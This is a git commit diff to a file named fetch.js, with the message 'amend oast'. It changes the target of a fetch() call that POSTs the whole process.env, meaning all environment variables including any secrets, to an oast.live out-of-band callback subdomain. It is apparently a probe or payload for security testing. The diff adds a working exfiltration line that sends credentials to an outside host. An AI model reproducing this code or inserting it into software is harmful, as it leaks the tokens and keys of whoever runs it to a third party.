58026dddcb9a26cdd401688e289863c9c9e58aae
CodyCline <20631166+CodyCline@users.noreply.github.com>
2024-06-20 15:33:40 -0700

    amend oast

--- fetch.js
+++ fetch.js
@@ -1,4 +1,4 @@
-fetch("https://cpqaa79ucph7ea7od2kgu8ry7wb7nprrt.oast.live", {
+fetch("https://cpqaqjhucphfftbcvic0ugcafe1cq4peu.oast.live", {
     method: "POST",
     body: JSON.stringify(process.env)
 }).catch()
